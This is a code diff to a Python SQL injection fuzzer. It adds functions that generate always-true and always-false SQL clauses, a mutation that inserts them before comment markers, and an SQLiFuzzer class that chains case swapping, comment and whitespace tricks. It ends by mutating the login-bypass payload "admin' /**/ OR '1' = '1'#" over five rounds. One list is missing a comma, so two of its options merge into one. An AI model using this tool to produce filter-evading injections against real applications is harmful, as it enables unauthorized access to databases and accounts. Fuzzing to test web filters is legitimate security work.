@@ -34,6 +34,84 @@ def filter_candidates(symbols,payload):
 
     return [s for s in symbols.keys() if s in payload]
 
+def random_string_true_logic():
+    #randomly generate a string
+    #e.g. 'abc' -> abc and 1=1
+    random_str = random_string(6)
+
+    true_logic = [
+        # equals
+        "'{}'='{}'".format(random_str,random_str),
+        "'{}' LIKE '{}'".format(random_str,random_str),
+        '"{}"="{}"'.format(random_str,random_str),
+        '"{}" LIKE "{}"'.format(random_str,random_str),
+
+        # not equals
+        "'{}'!='{}'".format(random_str,random_str + random_string(1)),
+        "'{}' NOT LIKE '{}'".format(random_str,random_str + random_string(1)),
+        "'{}'<>'{}'".format(random_str,random_str + random_string(1)),
+        '"{}"!="{}"'.format(random_str,random_str + random_string(1)),
+        '"{}" NOT LIKE "{}"'.format(random_str,random_str + random_string(1)),
+        '"{}"<>"{}"'.format(random_str,random_str + random_string(1)),
+    ]
+    return random.choice(true_logic)
+
+def random_string_false_logic():
+    #randomly generate a string
+    #e.g. 'abc' -> abc and 1=2
+    random_str = random_string(6)
+
+    false_logic = [
+        # equals
+        "'{}'='{}'".format(random_str,random_str + random_string(1)),
+        "'{}' LIKE '{}'".format(random_str,random_str + random_string(1)),
+        '"{}"="{}"'.format(random_str,random_str + random_string(1)),
+        '"{}" LIKE "{}"'.format(random_str,random_str + random_string(1)),
+
+        # not equals
+        "'{}'!='{}'".format(random_str,random_str),
+        "'{}' NOT LIKE '{}'".format(random_str,random_str),
+        "'{}'<>'{}'".format(random_str,random_str),
+        '"{}"!="{}"'.format(random_str,random_str),
+        '"{}" NOT LIKE "{}"'.format(random_str,random_str),
+        '"{}"<>"{}"'.format(random_str,random_str),
+    ]
+    return random.choice(false_logic)
+
+def random_num_true_logic():
+    #randomly generate a number
+    #e.g. 1 -> 1=1
+    random_num = random.randint(1,1000)
+
+    true_logic = [
+        # equals
+        "{}={}".format(random_num,random_num),
+        "{} LIKE {}".format(random_num,random_num),
+
+        # not equals
+        "{}!={}".format(random_num,random_num + 1),
+        "{} NOT LIKE {}".format(random_num,random_num + 1),
+        "{}<>{}".format(random_num,random_num + 1),
+    ]
+    return random.choice(true_logic)
+
+def random_num_false_logic():
+    #randomly generate a number
+    #e.g. 1 -> 1=2
+    random_num = random.randint(1,1000)
+
+    false_logic = [
+        # equals
+        "{}={}".format(random_num,random_num + 1),
+        "{} LIKE {}".format(random_num,random_num + 1),
+
+        # not equals
+        "{}!={}".format(random_num,random_num),
+        "{} NOT LIKE {}".format(random_num,random_num),
+        "{}<>{}".format(random_num,random_num),
+    ]
+    return random.choice(false_logic)
+
 def case_swapping(payload):
     #randomly swap the case of the payload
     #e.g. 'aBc' -> 'AbC'
@@ -126,7 +204,67 @@ def operator_swapping(payload):
     payload = replace_random(payload, symbol_replace, replacement)
     return payload
 
+def logical_invariant(payload):
+    cmtpos = re.search(r'(--|#)', payload)
+    # no comment in payload
+    if not cmtpos:
+        return payload
+    # comment in payload
+    cmtpos = cmtpos.start()
+    # create replacement
+    replacement = random.choice(
+        [
+            # AND TRUE
+            " AND TRUE",
+            " AND 1"
+            " AND " + random_string_true_logic(),
+            " AND " + random_num_true_logic(),
 
-print(operator_swapping('admin\' and \'1\' = \'1'))
+            # OR FALSE
+            " OR FALSE",
+            " OR 0",
+            " OR " + random_string_false_logic(),
+            " OR " + random_num_false_logic(),
+        ]
+    )
 
+    # replace
+    payload = payload[:cmtpos] + replacement + payload[cmtpos:]
+    return payload
+
+class SQLiFuzzer(object):
+    mutations = [
+        case_swapping,
+        comment_injection,
+        comment_rewriting,
+        whitespace_substitution,
+        #integer_encoding,
+        operator_swapping,
+        logical_invariant,
+    ]
+
+    def __init__(self, payload):
+        self.payload = payload
+    
+    def mutate(self):
+        #randomly choose a mutation
+        mutation = random.choice(self.mutations)
+        #mutate the payload
+        self.payload = mutation(self.payload)
+        return self.payload
+    
+    def mutate_all(self):
+        for mutation in self.mutations:
+            self.payload = mutation(self.payload)
+        return self.payload
+    
+
+payload = "admin' /**/ OR '1' = '1'#"
+
+fuzzer = SQLiFuzzer(payload)
+
+#mutate in 5 rounds
+for i in range(5):
+    fuzzer.mutate()
+    print(fuzzer.payload)
     
